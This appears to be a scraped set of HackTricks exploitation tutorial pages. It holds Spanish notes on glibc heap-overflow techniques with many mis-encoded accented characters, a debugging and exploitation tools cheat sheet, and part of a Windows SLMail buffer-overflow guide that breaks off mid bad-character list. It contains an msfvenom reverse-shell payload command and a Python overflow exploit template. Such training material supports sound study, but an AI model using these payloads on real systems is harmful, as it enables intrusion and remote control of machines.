direcci√≥n.\nEn caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.\nAfter free()\nUn puntero previamente liberado es usado de nuevo sin control.\n8 Heap Overflows: Exploits avanzados\nLas t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().\nThe house of mind\nSolo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.\nUna llamada a free() provoca llamar a public_fREe(mem), este hace:\nmstate ar_ptr;\nmchunkptr p;\n‚Ä¶\np = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)\n‚Ä¶\nar_ptr = arena_for_chunk(p); ‚Äî> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:&main_arena [1]\n‚Ä¶\n_int_free(ar_ptr, mem);\n}\nEn [1] comprueba el campo size el bit NON_MAIN_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap_for_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar_ptr (como si fuese un struct heap_info)\nDe esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en\n0x081002a0\npodemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo\n0x0804a000\n. Cuando este segundo trozo se libere se encontrar√° que heap_for_ptr(ptr)->ar_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar_ptr)\nDe esta forma se llama a _int_free(ar_ptr, mem), es decir,\n_int_free(0x0804a000, 0x081002a0)\n_int_free(mstate av, Void_t* mem){\n‚Ä¶\nbck = unsorted_chunks(av);\nfwd = bck->fd;\np->bk = bck;\np->fd = fwd;\nbck->fd = p;\nfwd->bk = p;\n..}\nComo hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.\nTal y como se define unsorted_chunks, sabemos que:\nbck = &av->bins[2]-8;\nfwd = bck->fd = *(av->bins[2]);\nfwd->bk = *(av->bins[2] + 12) = p;\nPor lo tanto si en av->bins[2] escribimos el valor de __DTOR_END__-12 en la √∫ltima instrucci√≥n se escribir√° en __DTOR_END__ la direcci√≥n del segundo trozo.\nEs decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de __DTOR_END__-12 porque de ah√≠ la sacar√° av->bins[2]\nEn la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap_for_ptr() piense que el ar_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins[2]\nEn el segundo trozo y gracias al primero sobreescribimos el prev_size con un jump 0x0c y el size con algo para activar -> NON_MAIN_ARENA\nA continuaci√≥n en el trozo 2 ponemos un mont√≥n de nops y finalmente la shellcode\nDe esta forma se llamar√° a _int_free(TROZO1, TROZO2) y seguir√° las instrucciones para escribir en __DTOR_END__ la direcci√≥n del prev_size del TROZO2 el cual saltar√° a la shellcode.\nPara aplicar esta t√©cnica hace falta que se cumplan algunos requerimientos m√°s que complican un poco m√°s el payload.\nEsta t√©cnica ya no es aplicable pues se aplic√≥ casi el mismo parche que para unlink. Se comparan si el nuevo sitio al que se apunta tambi√©n le est√° apuntando a √©l.\nFastbin\nEs una variante de The house of mind\nnos interesa llegar a ejecutar el siguiente c√≥digo al cu√°l se llega pasada la primera comprobaci√≥n de la funci√≥n _int_free()\nfb = &(av->fastbins[fastbin_index(size)] ‚Äî> Siendo fastbin_index(sz) ‚Äî> (sz >> 3) - 2\n‚Ä¶\np->fd = *fb\n*fb = p\nDe esta forma si se pone en ‚Äúfb‚Äù da direcci√≥n de una funci√≥n en la GOT, en esta direcci√≥n se pondr√° la direcci√≥n al trozo sobrescrito. Para esto ser√° necesario que la arena est√© cerca de las direcciones de dtors. M√°s exactamente que av->max_fast est√© en la direcci√≥n que vamos a sobreescribir.\nDado que con The House of Mind se vio que nosotros control√°bamos la posici√≥n del av.\nEntones si en el campo size ponemos un tama√±o de 8 + NON_MAIN_ARENA + PREV_INUSE ‚Äî> fastbin_index() nos devolver√° fastbins[-1], que apuntar√° a av->max_fast\nEn este caso av->max_fast ser√° la direcci√≥n que se sobrescrita (no a la que apunte, sino esa posici√≥n ser√° la que se sobrescrita).\nAdem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 8, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops).\nAdem√°s, ese mismo trozo falso debe ser menor que av->system_mem. av->system_mem se encuentra 1848 bytes m√°s all√°.\nPor culpa de los nulos de _DTOR_END_ y de las pocas direcciones en la GOT, ninguna direcci√≥n de estas secciones sirven para ser sobrescritas, as√≠ que veamos como aplicar fastbin para atacar la pila.\nOtra forma de ataque es redirigir el\nav\nhacia la pila.\nSi modificamos el size para que de 16 en vez de 8 entonces: fastbin_index() nos devolver√° fastbins[0] y podemos hacer uso de esto para sobreescribir la pila.\nPara esto no debe haber ning√∫n canary ni valores raros en la pila, de hecho tenemos que encontrarnos en esta: 4bytes nulos + EBP + RET\nLos 4 bytes nulo se necesitan que el\nav\nestar√° a esta direcci√≥n y el primero elemento de un\nav\nes el mutexe que tiene que valer 0.\nEl\nav->max_fast\nser√° el EBP y ser√° un valor que nos servir√° para saltarnos las restricciones.\nEn el\nav->fastbins[0]\nse sobreescribir√° con la direcci√≥n de\np\ny ser√° el RET, as√≠ se saltar√° a la shellcode.\nAdem√°s, en\nav->system_mem\n(1484bytes por encima de la posici√≥n en la pila) habr√° bastante basura que nos permitir√° saltarnos la comprobaci√≥n que se realiza.\nAdem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 16, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops que van despu√©s del campo size del nuevo trozo falso).\nThe House of Spirit\nEn este caso buscamos tener un puntero a un malloc que pueda ser alterable por el atacante (por ej, que el puntero est√© en el stack debajo de un posible overflow a una variable).\nAs√≠, podr√≠amos hacer que este puntero apuntase a donde fuese. Sin embargo, no cualquier sitio es v√°lido, el tama√±o del trozo falseado debe ser menor que av->max_fast y m√°s espec√≠ficamente igual al tama√±o solicitado en una futura llamada a malloc()+8. Por ello, si sabemos que despu√©s de este puntero vulnerable se llama a malloc(40), el tama√±o del trozo falso debe ser igual a 48.\nSi por ejemplo el programa preguntase al usuario por un n√∫mero podr√≠amos introducir 48 y apuntar el puntero de malloc modificable a los siguientes 4bytes (que podr√≠an pertenecer al EBP con suerte, as√≠ el 48 queda por detr√°s, como si fuese la cabecera size). Adem√°s, la direcci√≥n ptr-4+48 debe cumplir varias condiciones (siendo en este caso ptr=EBP), es decir, 8 < ptr-4+48 < av->system_mem.\nEn caso de que esto se cumpla, cuando se llame al siguiente malloc que dijimos que era malloc(40) se le asignar√° como direcci√≥n la direcci√≥n del EBP. En caso de que el atacante tambi√©n pueda controlar lo que se escribe en este malloc puede sobreescribir tanto el EBP como el EIP con la direcci√≥n que quiera.\nEsto creo que es porque as√≠ cuando lo libere free() guardar√° que en la direcci√≥n que apunta al EBP del stack hay un trozo de tama√±o perfecto para el nuevo malloc() que se quiere reservar, as√≠ que le asigna esa direcci√≥n.\nThe House of Force\nEs necesario:\nUn overflow a un trozo que permita sobreescribir el wilderness\nUna llamada a malloc() con el tama√±o definido por el usuario\nUna llamada a malloc() cuyos datos puedan ser definidos por el usuario\nLo primero que se hace es sobreescribir el size del trozo wilderness con un valor muy grande (0xffffffff), as√≠ cual quiera solicitud de memoria lo suficientemente grande ser√° tratada en _int_malloc() sin necesidad de expandir el heap\nLo segundo es alterar el av->top para que apunte a una zona de memoria bajo el control del atacante, como el stack. En av->top se pondr√° &EIP - 8.\nTenemos que sobreescrbir av->top para que apunte a la zona de memoria bajo el control del atacante:\nvictim = av->top;\nremainder = chunck_at_offset(victim, nb);\nav->top = remainder;\nVictim recoge el valor de la direcci√≥n del trozo wilderness actual (el actual av->top) y remainder es exactamente la suma de esa direcci√≥n m√°s la cantidad de bytes solicitados por malloc(). Por lo que si &EIP-8 est√° en 0xbffff224 y av->top contiene 0x080c2788, entonces la cantidad que tenemos que reservar en el malloc controlado para que av->top quede apuntando a $EIP-8 para el pr√≥ximo malloc() ser√°:\n0xbffff224 - 0x080c2788 = 3086207644.\nAs√≠ se guardar√° en av->top el valor alterado y el pr√≥ximo malloc apuntar√° al EIP y lo podr√° sobreescribir.\nEs importante saber que el size del nuevo trozo wilderness sea m√°s grande que la solicitud realizada por el √∫ltimo malloc(). Es decir, si el wilderness est√° apuntando a &EIP-8, el size quedar√° justo en el campo EBP del stack.\nThe House of Lore\nCorrupci√≥n SmallBin\nLos trozos liberados se introducen en el bin en funci√≥n de su tama√±o. Pero antes de introduciros se guardan en unsorted bins. Un trozo es liberado no se mete inmediatamente en su bin sino que se queda en unsorted bins. A continuaci√≥n, si se reserva un nuevo trozo y el anterior liberado le puede servir se lo devuelve, pero si se reserva m√°s grande, el trozo liberado en unsorted bins se mete en su bin adecuado.\nPara alcanzar el c√≥digo vulnerable la solicitud de memora deber√° ser mayor a av->max_fast (72normalmente) y menos a MIN_LARGE_SIZE (512).\nSi en los bin hay un trozo del tama√±o adecuado a lo que se pide se devuelve ese despu√©s de desenlazarlo:\nbck = victim->bk; Apunta al trozo anterior, es la √∫nica info que podemos alterar.\nbin->bk = bck; El pen√∫ltimo trozo pasa a ser el √∫ltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le dar√° esta direcci√≥n\nbck->fd = bin; Se cierra la lista haciendo que este apunte a bin\nSe necesita:\nQue se reserven dos malloc, de forma que al primero se le pueda hacer overflow despu√©s de que el segundo haya sido liberado e introducido en su bin (es decir, se haya reservado un malloc superior al segundo trozo antes de hacer el overflow)\nQue el malloc reservado al que se le da la direcci√≥n elegida por el atacante sea controlada por el atacante.\nEl objetivo es el siguiente, si podemos hacer un overflow a un heap que tiene por debajo un trozo ya liberado y en su bin, podemos alterar su puntero bk. Si alteramos su puntero bk y este trozo llega a ser el primero de la lista de bin y se reserva, a bin se le enga√±ar√° y se le dir√° que el √∫ltimo trozo de la lista (el siguiente en ofrecer) est√° en la direcci√≥n falsa que hayamos puesto (al stack o GOT por ejemplo). Por lo que si se vuelve a reservar otro trozo y el atacante tiene permisos en √©l, se le dar√° un trozo en la posici√≥n deseada y podr√° escribir en ella.\nTras liberar el trozo modificado es necesario que se reserve un trozo mayor al liberado, as√≠ el trozo modificado saldr√° de unsorted bins y se introducir√≠a en su bin.\nUna vez en su bin es el momento de modificarle el puntero bk mediante el overflow para que apunte a la direcci√≥n que queramos sobreescribir.\nAs√≠ el bin deber√° esperar turno a que se llame a malloc() suficientes veces como para que se vuelva a utilizar el bin modificado y enga√±e a bin haci√©ndole creer que el siguiente trozo est√° en la direcci√≥n falsa. Y a continuaci√≥n se dar√° el trozo que nos interesa.\nPara que se ejecute la vulnerabilidad lo antes posible lo ideal ser√≠a: Reserva del trozo vulnerable, reserva del trozo que se modificar√°, se libera este trozo, se reserva un trozo m√°s grande al que se modificar√°, se modifica el trozo (vulnerabilidad), se reserva un trozo de igual tama√±o al vulnerado y se reserva un segundo trozo de igual tama√±o y este ser√° el que apunte a la direcci√≥n elegida.\nPara proteger este ataque se uso la t√≠pica comprobaci√≥n de que el trozo ‚Äúno‚Äù es falso: se comprueba si bck->fd est√° apuntando a victim. Es decir, en nuestro caso si el puntero fd* del trozo falso apuntado en el stack est√° apuntando a victim. Para sobrepasar esta protecci√≥n el atacante deber√≠a ser capaz de escribir de alguna forma (por el stack probablemente) en la direcci√≥n adecuada la direcci√≥n de victim. Para que as√≠ parezca un trozo verdadero.\nCorrupci√≥n LargeBin\nSe necesitan los mismos requisitos que antes y alguno m√°s, adem√°s los trozos reservados deben ser mayores a 512.\nEl ataque es como el anterior, es decir, ha que modificar el puntero bk y se necesitan todas esas llamadas a malloc(), pero adem√°s hay que modificar el size del trozo modificado de forma que ese size - nb sea < MINSIZE.\nPor ejemplo har√° que poner en size 1552 para que 1552 - 1544 = 8 < MINSIZE (la resta no puede quedar negativa porque se compara un unsigned)\nAdem√°s se ha introducido un parche para hacerlo a√∫n m√°s complicado.\nHeap Spraying\nB√°sicamente consiste en reservar tooda la memoria posible para heaps y rellenar estos con un colch√≥n de nops acabados por una shellcode. Adem√°s, como colch√≥n se utiliza 0x0c. Pues se intentar√° saltar a la direcci√≥n 0x0c0c0c0c, y as√≠ si se sobreescribe alguna direcci√≥n a la que se vaya a llamar con este colch√≥n se saltar√° all√≠. B√°sicamente la t√°ctica es reservar lo m√°ximos posible para ver si se sobreescribe alg√∫n puntero y saltar a 0x0c0c0c0c esperando que all√≠ haya nops.\nHeap Feng Shui\nConsiste en mediante reservas y liberaciones sementar la memoria de forma que queden trozos reservados entre medias de trozos libres. El buffer a desbordar se situar√° en uno de los huevos.\nobjdump -d ejecutable\n‚Äî> Disas functions\nobjdump -d ./PROGRAMA | grep FUNCION\n‚Äî> Get function address\nobjdump -d -Mintel ./shellcodeout\n‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes\nobjdump -t ./exec | grep varBss\n‚Äî> Tabla de s√≠mbolos, para sacar address de variables y funciones\nobjdump -TR ./exec | grep exit(func lib)\n‚Äî> Para sacar address de funciones de librer√≠as (GOT)\nobjdump -d ./exec | grep funcCode\nobjdump -s -j .dtors /exec\nobjdump -s -j .got ./exec\nobjdump -t --dynamic-relo ./exec | grep puts\n‚Äî> Saca la direcci√≥n de puts a sobreescribir en le GOT\nobjdump -D ./exec\n‚Äî> Disas ALL hasta las entradas de la plt\nobjdump -p -/exec\nInfo functions strncmp ‚Äî>\nInfo de la funci√≥n en gdb\nInteresting courses\n‚Äã\nhttps://guyinatuxedo.github.io/\n‚Äã\n‚Äã\nhttps://github.com/RPISEC/MBE\n‚Äã\nReferences\n‚Äã\nhttps://guyinatuxedo.github.io/7.2-mitigation_relro/index.html\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nReversing & Exploiting -\nPrevious\nWord Macros\nNext\nFormat Strings Template\nLast modified\n2mo ago"
    },
    {
        "title": "Exploiting Tools",
        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/tools",
        "text": "Exploiting Tools\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMetasploit\npattern_create.rb -l 3000   #Length\npattern_offset.rb -l 3000 -q 5f97d534   #Search offset\nnasm_shell.rb\nnasm> jmp esp   #Get opcodes\nmsfelfscan -j esi /opt/fusion/bin/level01\nShellcodes\nmsfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b \"\\x00\\x0a\\x0d\" -f c\nGDB\nInstall\napt-get install gdb\nParameters\n-q\n--> No show banner\n-x <file>\n--> Auto-execute GDB instructions from here\n-p <pid>\n--> Attach to process\nInstructions\n>\ndisassemble main\n--> Disassemble the function\n>\ndisassemble 0x12345678\n>\nset disassembly-flavor intel\n>\nset follow-fork-mode child/parent\n--> Follow created process\n>\np system\n--> Find the address of the system function\n>\nhelp\n>\nquit\n>\nbr func\n--> Add breakpoint to function\n>\nbr *func+23\n>\nbr *0x12345678\n> del NUM\n--> Delete that number of br\n>\nwatch EXPRESSION\n--> Break if the value changes\n> run\n--> Execute\n> start\n--> Start and break in main\n>\nn/next\n--> Execute next instruction (no inside)\n>\ns/step\n--> Execute next instruction\n>\nc/continue\n--> Continue until next breakpoint\n>\nset $eip = 0x12345678\n--> Change value of $eip\n>\ninfo functions\n--> Info abount functions\n>\ninfo functions func\n--> Info of the funtion\n>\ninfo registers\n--> Value of the registers\n>\nbt\n--> Stack\n>\nbt full\n--> Detailed stack\n>\nprint variable\n>\nprint 0x87654321 - 0x12345678\n--> Caculate\n>\nexamine o/x/u/t/i/s dir_mem/reg/puntero\n--> Shows content in octal/hexa/10/bin/instruction/ascii\nx/o 0xDir_hex\nx/2x $eip\n--> 2Words from EIP\nx/2x $eip -4\n--> $eip - 4\nx/8xb $eip\n--> 8 bytes (b-> byte, h-> 2bytes, w-> 4bytes, g-> 8bytes)\ni r eip\n--> Value of $eip\nx/w pointer\n--> Value of the pointer\nx/s pointer\n--> String pointed by the pointer\nx/xw &pointer\n--> Address where the pointer is located\nx/i $eip\n‚Äî> Instructions of the EIP\n‚Äã\nGEF\n‚Äã\nchecksec\n#Check protections\np system\n#Find system function address\nsearch-pattern\n\"/bin/sh\"\n#Search in the process memory\nvmmap\n#Get memory mappings\n‚Äã\n#Shellcode\nshellcode search x86\n#Search shellcodes\nshellcode get\n61\n#Download shellcode number 61\n‚Äã\n#Patterns\npattern create\n200\n#Generate length 200 pattern\npattern search\n\"avaaawaa\"\n#Search for the offset of that substring\npattern search\n$rsp\n#Search the offset given the content of $rsp\n\u0000‚Äã\n#Another way to get the offset of to the RIP\n1\n- Put a bp after the\nfunction\nthat overwrites the RIP and send a ppatern to ovwerwrite it\n2\n- ef‚û§  i f\nStack level\n0\n, frame at 0x7fffffffddd0:\nrip\n=\n0x400cd3\n;\nsaved rip\n=\n0x6261617762616176\ncalled by frame at 0x7fffffffddd8\nArglist at 0x7fffffffdcf8, args:\nLocals at 0x7fffffffdcf8, Previous frame\n's sp is 0x7fffffffddd0\nSaved registers:\nrbp at 0x7fffffffddc0, rip at 0x7fffffffddc8\ngef‚û§  pattern search 0x6261617762616176\n[+] Searching for '\n0x6261617762616176'\n[\n+\n]\nFound at offset\n184\n(\nlittle-endian search\n)\nlikely\nTricks\nGDB same addresses\nWhile debugging GDB will have\nslightly different addresses than the used by the binary when executed.\nYou can make GDB have the same addresses by doing:\nunset env LINES\nunset env COLUMNS\nset env _=<path>\nPut the absolute path to the binary\nExploit the binary using the same absolute route\nPWD\nand\nOLDPWD\nmust be the same when using GDB and when exploiting the binary\nBacktrace to find functions called\nWhen you have a\nstatically linked binary\nall the functions will belong to the binary (and no to external libraries). In this case it will be difficult to\nidentify the flow that the binary follows to for example ask for user input\n.\nYou can easily identify this flow by\nrunning\nthe binary with\ngdb\nuntil you are asked for input. Then, stop it with\nCTRL+C\nand use the\nbt\n(\nbacktrace\n) command to see the functions called:\ngef‚û§  bt\n#0  0x00000000004498ae in ?? ()\n#1  0x0000000000400b90 in ?? ()\n#2  0x0000000000400c1d in ?? ()\n#3  0x00000000004011a9 in ?? ()\n#4  0x0000000000400a5a in ?? ()\nGDB server\ngdbserver --multi 0.0.0.0:23947\n(in IDA you have to fill the absolute path of the executable in the Linux machine and in the Windows machine)\nGhidra\nFind stack offset\nGhidra\nis very useful to find the the\noffset\nfor a\nbuffer overflow thanks to the information about the position of the local variables.\nFor example, in the example below, a buffer flow in\nlocal_bc\nindicates that you need an offset of\n0xbc\n. Moreover, if\nlocal_10\nis a canary cookie it indicates that to overwrite it from\nlocal_bc\nthere is an offset of\n0xac\n.\nRemember that the first 0x08 from where the RIP is saved belongs to the RBP.\nGCC\ngcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2\n--> Compile without protections\n-o\n--> Output\n-g\n--> Save code (GDB will be able to see it)\necho 0 > /proc/sys/kernel/randomize_va_space\n--> To deactivate the ASLR in linux\nTo compile a shellcode:\nnasm -f elf assembly.asm\n--> return a \".o\"\nld assembly.o -o shellcodeout\n--> Executable\nObjdump\n-d\n-->\nDisassemble executable\nsections (see opcodes of a compiled shellcode, find ROP Gadgets, find function address...)\n-Mintel\n-->\nIntel\nsyntax\n-t\n-->\nSymbols\ntable\n-D\n-->\nDisassemble all\n(address of static variable)\n-s -j .dtors\n--> dtors section\n-s -j .got\n--> got section\n-D -s -j .plt -->\nplt\nsection\ndecompiled\n-TR\n-->\nRelocations\nojdump -t --dynamic-relo ./exec | grep puts\n--> Address of \"puts\" to modify in GOT\nobjdump -D ./exec | grep \"VAR_NAME\"\n--> Address or a static variable (those are stored in DATA section).\nCore dumps\n1.\nRun\nulimit -c unlimited\nbefore starting my program\n2.\nRun\nsudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t\n3.\nsudo gdb --core=<path/core> --quiet\nMore\nldd executable | grep libc.so.6\n--> Address (if ASLR, then this change every time)\nfor i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done\n--> Loop to see if the address changes a lot\nreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep system\n--> Offset of \"system\"\nstrings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh\n--> Offset of \"/bin/sh\"\nstrace executable\n--> Functions called by the executable\nrabin2 -i ejecutable -->\nAddress of all the functions\nInmunity debugger\n!\nmona modules\n#Get protections, look for all false except last one (Dll of SO)\n!\nmona\nfind\n-s\n\"\n\\xff\\xe4\n\"\n-m\nname_unsecure.dll\n#Search for opcodes insie dll space (JMP ESP)\nIDA\nDebugging in remote linux\nInside the IDA folder you can find binaries that can be used to debug a binary inside a linux. To do so move the binary\nlinux_server\nor\nlinux_server64\ninside the linux server and run it nside the folder that contains the binary:\n./linux_server64 -Ppass\nThen, configure the debugger: Debugger (linux remote) --> Proccess options...:\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nFusion\nNext\nPwnTools\nLast modified\n6mo ago"
    },
    {
        "title": "Windows Exploiting (Basic Guide - OSCP lvl)",
        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/windows-exploiting-basic-guide-oscp-lvl",
        "text": "Windows Exploiting (Basic Guide - OSCP lvl)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nStart installing the SLMail service\nRestart SLMail service\nEvery time you need to\nrestart the service SLMail\nyou can do it using the windows console:\nnet start slmail\nVery basic python exploit template\n#!/usr/bin/python\n‚Äã\nimport\nsocket\n‚Äã\ns\n=\nsocket\n.\nsocket\n(\nsocket\n.\nAF_INET\n,\nsocket\n.\nSOCK_STREAM\n)\nip\n=\n'10.11.25.153'\nport\n=\n110\n‚Äã\nbuffer\n=\n'A'\n*\n2700\ntry\n:\nprint\n\"\\nLaunching exploit...\"\ns\n.\nconnect\n((\nip\n,\nport\n))\ndata\n=\ns\n.\nrecv\n(\n1024\n)\ns\n.\nsend\n(\n'USER username'\n+\n'\\r\\n'\n)\ndata\n=\ns\n.\nrecv\n(\n1024\n)\ns\n.\nsend\n(\n'PASS '\n+\nbuffer\n+\n'\\r\\n'\n)\nprint\n\"\\nFinished!.\"\nexcept\n:\nprint\n\"Could not connect to \"\n+\nip\n+\n\":\"\n+\nport\nChange Immunity Debugger Font\nGo to\nOptions >> Appearance >> Fonts >> Change(Consolas, Blod, 9) >> OK\nAttach the proces to Immunity Debugger:\nFile --> Attach\nAnd press START button\nSend the exploit and check if EIP is affected:\nEvery time you break the service you should restart it as is indicated in the beginnig of this page.\nCreate a pattern to modify the EIP\nThe pattern should be as big as the buffer you used to broke the service previously.\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000\nChange the buffer of the exploit and set the pattern and lauch the exploit.\nA new crash should appeard, but with a different EIP address:\nCheck if the address was in your pattern:\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39694438\nLooks like\nwe can modify the EIP in offset 2606\nof the buffer.\nCheck it modifing the buffer of the exploit:\nbuffer = 'A'*2606 + 'BBBB' + 'CCCC'\nWith this buffer the EIP crashed should point to 42424242 (\"BBBB\")\nLooks like it is working.\nCheck for Shellcode space inside the stack\n600B should be enough for any powerfull shellcode.\nLets change the bufer:\nbuffer = 'A'*2606 + 'BBBB' + 'C'*600\nlaunch the new exploit and check the EBP and the length of the usefull shellcode\nYou can see that when the vulnerability is reached, the EBP is pointing to the shellcode and that we have a lot of space to locate a shellcode here.\nIn this case we have\nfrom 0x0209A128 to 0x0209A2D6 = 430B.\nEnough.\nCheck for bad chars\nChange again the buffer:\nbadchars = (\n\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xf